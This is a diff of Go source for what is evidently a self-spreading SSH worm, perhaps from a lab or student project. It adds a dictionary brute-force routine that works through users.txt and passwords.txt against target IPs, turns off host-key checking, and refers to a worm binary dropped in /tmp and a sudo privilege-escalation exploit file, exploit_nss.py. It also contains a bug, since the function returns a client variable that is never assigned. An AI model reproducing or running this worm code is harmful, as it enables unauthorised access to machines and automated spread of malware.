@@ -9,92 +9,94 @@ import (
 	"math/rand"
 	"os"
 	"bufio"
-	"fmt"
+	//"fmt"
 )
 
 var (
-	username = "ubuntu"
-	password = "ubuntu"
+	username = "kali"
+	password = "kali"
 	worm_dir = "/tmp"
 	sudo_exploit_filename = "exploit_nss.py"
 	worm_filename = "worm" + strconv.Itoa(rand.Intn(3))
 	timeout = time.Minute
 )
 
+func GuessSSHConnection (ip string) bool {
+	var client *ssh.Client
+	var session *ssh.Session
+
+	timeout = time.Minute
+  users,err_users := os.Open("users.txt")
+  if err_users != nil {
+    log.Fatal(err_users)
+  }
+  defer users.Close()
+  user_scanner := bufio.NewScanner(users)
+  for user_scanner.Scan() {
+		if (client == nil && session == nil) {
+			username = user_scanner.Text()
+			pwds,err_pwds := os.Open("passwords.txt")
+	  	if err_pwds != nil {
+	    	log.Fatal(err_pwds)
+	  	}
+			defer pwds.Close()
+			pwd_scanner := bufio.NewScanner(pwds)
+    	for pwd_scanner.Scan(){
+					if (client == nil && session == nil) {
+						password = pwd_scanner.Text()
+						client, session = OpenSSHConnection(ip)
+			  }
+    	}
+
+			if err_pwds := pwd_scanner.Err(); err_pwds != nil {
+	    	log.Fatal(err_pwds)
+	  	}
+		}
+  }
+
+  if err_users := user_scanner.Err(); err_users != nil {
+    log.Fatal(err_users)
+  }
+
+	if (session != nil){
+		return true
+	} else {
+		return false
+	}
+
+}
+
 func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
 	var c *ssh.Client
 	var s *ssh.Session
-	//var err error
+	var err error
+
 	var miss bool
-	var goNext bool
 
-	users,err_users := os.Open("users.txt")
-
-	if err_users != nil {
-		log.Fatal(err_users)
+	config := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout: timeout,
 	}
-	defer users.Close()
+	miss = false
 
-	user_scanner := bufio.NewScanner(users)
-
-	for user_scanner.Scan() {
-		username := user_scanner.Text()
-		pwds,err_pwds := os.Open("passwords.txt")
-		if err_pwds != nil {
-			log.Fatal(err_pwds)
-		}
-		defer pwds.Close()
-		pwd_scanner := bufio.NewScanner(pwds)
-		for pwd_scanner.Scan(){
-			password := pwd_scanner.Text()
-			miss = false
-			goNext = false
-
-			fmt.Println("Trying new pair:", "username:", username, "password:", password, "on ip:", ip)
-			config := &ssh.ClientConfig{
-				User: username,
-				Auth: []ssh.AuthMethod{
-					ssh.Password(password),
-				},
-				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-				Timeout: timeout,
-			}
-
-			client, err := ssh.Dial("tcp",ip,config)
-			if err != nil && !goNext {
-				log.Println("Failed to dial: ", err)
-				miss = true
-				goNext = true
-			}
-
-			if !goNext {
-				s, err = client.NewSession()
-				if err != nil {
-					log.Println("Failed to create session: ", err)
-					miss = true
-					goNext = true
-				}
-			}
-
-			if !miss {
-				return c,s
-			}
-		}
-
-
-
-		if err_pwds := pwd_scanner.Err(); err_pwds != nil {
-		  log.Fatal(err_pwds)
-		}
+	log.Println("Connecting with pair:", "username:", username, "password:", password, "on ip:", ip)
+	client, err := ssh.Dial("tcp",ip,config)
+	if err != nil {
+		log.Println("Failed to dial: ", err)
+		miss = true
 	}
-	log.Println("Not a single hit in dictionary")
-	if err_users := user_scanner.Err(); err_users != nil {
-	  log.Fatal(err_users)
-	}
-
+	if !miss {
+	  s, err = client.NewSession()
+	  if err != nil {
+	  	log.Println("Failed to create session: ", err)
+	  }
+  }
 	return c,s
 }
-
 
 func SshCheckInfection(ip string) bool {
 	client, session := OpenSSHConnection(ip)
